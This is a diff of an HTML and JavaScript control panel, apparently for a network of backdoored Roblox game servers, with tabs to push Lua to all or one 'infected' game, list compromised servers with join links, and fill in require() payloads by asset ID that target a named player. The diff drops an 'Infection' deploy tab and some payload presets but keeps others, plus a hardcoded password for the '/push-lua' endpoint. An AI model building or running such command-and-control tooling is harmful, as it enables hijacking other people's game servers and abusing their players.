@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus  | Final Build</title>
+    <title>Nexus  | Stable</title>
     <style>
         :root { --apple-blue: #0071e3; --bg: #000; }
         body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
@@ -22,8 +22,7 @@
         .status-bar.found { background: rgba(52,199,89,0.1); color: #34c759; }
         .node-box { background: #0b0b0c; border-radius: 10px; height: 180px; overflow-y: auto; border: 1px solid #333; }
         .game-item { padding: 12px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
-        .join-btn { background: #fff; color: #000; text-decoration: none; font-size: 10px; font-weight: 800; padding: 6px 12px; border-radius: 12px; transition: 0.2s; }
-        .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(10px); padding: 8px 15px; border-radius: 20px; border: 1px solid #444; display: flex; gap: 10px; z-index: 2000; }
+        .join-btn { background: #fff; color: #000; text-decoration: none; font-size: 10px; font-weight: 800; padding: 6px 12px; border-radius: 12px; }
     </style>
 </head>
 <body onclick="startAudio()">
@@ -45,12 +44,9 @@
             <div id="mass" class="tab-content">
                 <h2>Mass Execution</h2>
                 <div class="row-btns">
-                    <button class="rh-pill" onclick="fillRH(1, 'm_lua')">Last Rig</button>
-                    <button class="rh-pill" onclick="fillRH(2, 'm_lua')">Require.EXE</button>
-                    <button class="rh-pill" onclick="fillRH(3, 'm_lua')">Darius</button>
-                    <button class="rh-pill" onclick="fillRH('R6', 'm_lua')">R6</button>
-                    <button class="rh-pill" onclick="fillRH('DS', 'm_lua')">DarkSynapse</button>
                     <button class="rh-pill" onclick="fillRH('Steve', 'm_lua')">Steve</button>
+                    <button class="rh-pill" onclick="fillRH(3, 'm_lua')">Darius</button>
+                    <button class="rh-pill" onclick="fillRH('DS', 'm_lua')">DarkSynapse</button>
                 </div>
                 <textarea id="m_lua" rows="7" placeholder="-- Global Lua"></textarea>
                 <button class="btn-main" onclick="send('mass')">Execute All</button>
@@ -60,14 +56,10 @@
                 <h2>Single Execution</h2>
                 <div id="target-status" class="status-bar">Join the infected game</div>
                 <div class="row-btns">
-                    <button class="rh-pill" onclick="fillRH(1, 's_lua')">Last Rig</button>
-                    <button class="rh-pill" onclick="fillRH(2, 's_lua')">Require.EXE</button>
-                    <button class="rh-pill" onclick="fillRH(3, 's_lua')">Darius</button>
-                    <button class="rh-pill" onclick="fillRH('R6', 's_lua')">R6</button>
-                    <button class="rh-pill" onclick="fillRH('DS', 's_lua')">DarkSynapse</button>
                     <button class="rh-pill" onclick="fillRH('Steve', 's_lua')">Steve</button>
+                    <button class="rh-pill" onclick="fillRH(3, 's_lua')">Darius</button>
                 </div>
-                <select id="target_id" disabled><option value="">Auto-Scanning...</option></select>
+                <select id="target_id" disabled><option value="">Waiting for data...</option></select>
                 <textarea id="s_lua" rows="5" placeholder="-- Target Lua"></textarea>
                 <button class="btn-main" onclick="send('single')">Execute Target</button>
             </div>
@@ -75,26 +67,14 @@
             <div id="wl" class="tab-content" style="display:none;">
                 <h2>Whitelist</h2>
                 <input type="text" id="wid" placeholder="Enter Full Roblox Username">
-                <button class="btn-main" onclick="saveWl()">Save & Start Tracking</button>
-                <p id="save-msg" style="font-size: 10px; color: #34c759; margin-top: 5px; display: none;">Tracking active!</p>
+                <button class="btn-main" onclick="saveWl()">SAVE USERNAME</button>
             </div>
 
             <div id="nodes" class="tab-content" style="display:none;">
                 <h2>Active Games</h2>
                 <div id="node_list" class="node-box"></div>
             </div>
-            
-            <div id="inf" class="tab-content" style="display:none;">
-                <h2>Infection</h2>
-                <textarea id="i_lua" rows="8">require(127445614272366).op("Darius")</textarea>
-                <button class="btn-main" onclick="send('inf')">Deploy</button>
-            </div>
         </div>
-    </div>
-
-    <div class="music-ctrl">
-        <button id="pBtn" style="background:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; padding:5px 12px;" onclick="toggle()">PAUSE</button>
-        <button style="background:#ff3b30; color:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; padding:5px 12px;" onclick="stopMusic()">STOP</button>
     </div>
 
     <script>
@@ -103,9 +83,6 @@
         let detectedJobId = null;
 
         function startAudio() { if(audio.paused && audio.src !== "") audio.play().catch(()=>{}); }
-        function toggle() { audio.paused ? audio.play() : audio.pause(); }
-        function stopMusic() { audio.pause(); audio.src=""; document.querySelector('.music-ctrl').style.display='none'; }
-
         function showTab(id) {
             document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
             document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
@@ -113,21 +90,14 @@
             document.getElementById('btn-' + id).classList.add('active');
         }
 
-        function saveWl() {
-            document.getElementById('save-msg').style.display = 'block';
-            autoScan();
-            setTimeout(() => { document.getElementById('save-msg').style.display = 'none'; }, 2000);
-        }
+        function saveWl() { autoScan(); alert("Target Locked: " + document.getElementById('wid').value); }
 
         function fillRH(type, boxId) {
             const user = document.getElementById('wid').value || "Player";
             const box = document.getElementById(boxId);
-            if(type === 1) box.value = `require(132155655397653)("${user}")`;
-            if(type === 2) box.value = `require(125992639027440)["Require.EXE by E God"]("${user}")`;
-            if(type === 3) box.value = `require(127445614272366).op("${user}")`;
-            if(type === 'R6') box.value = `require(3436957371):r6("${user}")`;
-            if(type === 'DS') box.value = `require(133245855072069)("${user}", "DarkSynapse")`;
             if(type === 'Steve') box.value = `require(12246001294):Blockify("${user}")`;
+            if(type === 3) box.value = `require(127445614272366).op("${user}")`;
+            if(type === 'DS') box.value = `require(133245855072069)("${user}", "DarkSynapse")`;
         }
 
         function autoScan() {
@@ -138,8 +108,10 @@
 
             detectedJobId = null;
             for (let k in currentNodes) {
-                if (currentNodes[k].players && currentNodes[k].players.some(p => p.toLowerCase() === name)) {
-                    detectedJobId = k; break;
+                if (currentNodes[k].players && Array.isArray(currentNodes[k].players)) {
+                    if (currentNodes[k].players.some(p => p.toLowerCase() === name)) {
+                        detectedJobId = k; break;
+                    }
                 }
             }
 
@@ -150,7 +122,7 @@
             } else {
                 status.innerText = "Join the infected game";
                 status.className = "status-bar";
-                select.innerHTML = `<option value="">Searching for you...</option>`;
+                select.innerHTML = `<option value="">Searching...</option>`;
             }
         }
 
@@ -163,11 +135,11 @@
                 document.getElementById('node_list').innerHTML = keys.map(k => `
                     <div class="game-item">
                         <div>
-                            <b style="font-size:12px;">${currentNodes[k].name}</b><br>
-                            <small style="color:#666; font-size:9px;">${k}</small><br>
-                            <small style="color:var(--apple-blue); font-size:9px;">Players: ${currentNodes[k].players ? currentNodes[k].players.length : 0}</small>
+                            <b>${currentNodes[k].name || "Unknown Game"}</b><br>
+                            <small style="color:#666;">${k.substring(0,8)}...</small><br>
+                            <small style="color:var(--apple-blue);">Players: ${currentNodes[k].players ? currentNodes[k].players.length : 0}</small>
                         </div>
-                        <a class="join-btn" href="roblox://placeId=${currentNodes[k].placeId}&gameInstanceId=${k}">JOIN</a>
+                        <a class="join-btn" href="roblox://placeId=${currentNodes[k].placeId || ''}&gameInstanceId=${k}">JOIN</a>
                     </div>`).join('') || '<div style="padding:20px; text-align:center;">No Nodes Online</div>';
             } catch(e) {}
         }
@@ -175,7 +147,6 @@
         async function send(tabId) {
             const lua = document.querySelector(`#${tabId} textarea`).value;
             const tid = tabId === 'single' ? detectedJobId : null;
-            if(tabId === 'single' && !tid) return alert("Error: Join the infected game");
             await fetch('/push-lua', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lua, password:"Alt", targetId:tid})});
             alert("Payload Sent");
         }
